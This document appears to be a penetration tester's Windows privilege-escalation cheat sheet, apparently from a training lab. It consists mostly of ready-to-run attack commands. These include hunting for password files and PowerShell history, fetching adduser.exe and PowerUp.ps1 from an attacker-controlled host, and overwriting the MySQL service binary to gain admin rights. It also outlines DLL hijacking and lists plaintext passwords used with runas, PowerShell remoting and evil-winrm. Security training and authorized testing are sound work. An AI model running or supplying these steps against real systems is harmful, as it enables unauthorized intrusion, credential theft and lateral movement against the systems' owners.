When you gain access to a windows user do steps bellow:

1-whoami   #to discover who you are, if you are admin it's game over
2-whoami /groups
3-whoami /user
4-whoami /priv
5-if possible call a powershell session:
      powershell -ep bypass
      Get-LocalUser   #to enumerate interesting Local users
      Get-LocalGroup  #to enumerate insteresting Local groups
      Get-LocalGroupMember groupname #to list local group members
      systeminfo #to enumerate some important information about the system, as: OS name and version, hostname, architeture etc
      ipconfig /all #to enumerate ip addresses and discovering new networks to pivot
      route print #complement to previous command
      netstat -ano #to enumerame and discover open ports and active services 

      #to enumerate installed software, it's important review dowonload folders too
      Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname 
      Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
      
      Get-Process #to enumerate active processes 
      Get-Process -Name "NonStandardProcess" | Select-Object Path, Modules  #more information about a process
      Get-WmiObject Win32_Process -Filter "Name='NonStandardProcess.exe'" | Select-Object Name, ExecutablePath #alternative to previous command
      tasklist /FI "IMAGENAME eq NonStandardProcess.exe" /FO LIST #alternative to previous command

      #Trying find and enumerate important file
      Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
      Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
      type C:\xampp\passwords.txt

      Get-ChildItem -Path C:\Users -Include *.ini,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
      type C:\Users\dave\Desktop\asdf.txt

      #serching information on command history of the powershell
      Get-History
      (Get-PSReadlineOption).HistorySavePath
      type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

#Service Binary hijacking

      Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} #enumerate running service and identify vulnerable service
      icacls "C:\xampp\mysql\bin\mysqld.exe" #to verify if we have permission to do the substitution of file
      x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
      iwr -uri http://192.168.45.233:8000/adduser.exe -Outfile adduser.exe 
      move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
      move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
      net stop mysql # try stop mysql service
      Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}  #to verify start mode of the service
      whoami /priv #to check if current user has permission to reboot the system
      shutdown /r /t 0

      # the same did later, but now with PowerUp.ps1 script
      iwr -uri http://192.168.45.233:8000/PowerUp.ps1 -Outfile PowerUp.ps1
      powershell -ep bypass
      . .\PowerUp.ps1
      Get-ModifiableServiceFile
      Install-ServiceBinary -Name 'mysql'  #this command is going to fail because there a bug in a parameter use on a cmdlet, but you can use powerup to enumerate and finish the process manually.

#Service DLL Hijacking
      #standard search order to find a attached DLL
            #1. The directory from which the application loaded.
            #2. The system directory.
            #3. The 16-bit system directory.
            #4. The Windows directory. 
            #5. The current directory.
            #6. The directories that are listed in the PATH environment variable.
      Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}  #enumerate running service and identify vulnerable service
      icacls .\Documents\BetaServ.exe # to confirm that we don't have permission to change binario, if you have go to #Service Binary hijacking
      # get and start procmon64.exe (sysinternals suite), identify missing DLL on changeable paths
      $env:path
      

runas /user:"richmond" "powershell -ep bypass"   # GothicLifeStyle1337!
runas /user:"daveadmin" "powershell -ep bypass"   # qwertqwertqwert123!!
runas /user:"dave2" "powershell -ep bypass" # password123!

#powershell login
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred

#from kali
evil-winrm -i 192.168.210.220 -u daveadmin -p "qwertqwertqwert123\!\!"

#block events powershell
# Open Event Viewer and navigate to the following log location: Applications and Services Logs > Microsoft > Windows > PowerShell > Operational.
# https://www.techtarget.com/searchwindowsserver/tutorial/Set-up-PowerShell-script-block-logging-for-added-security
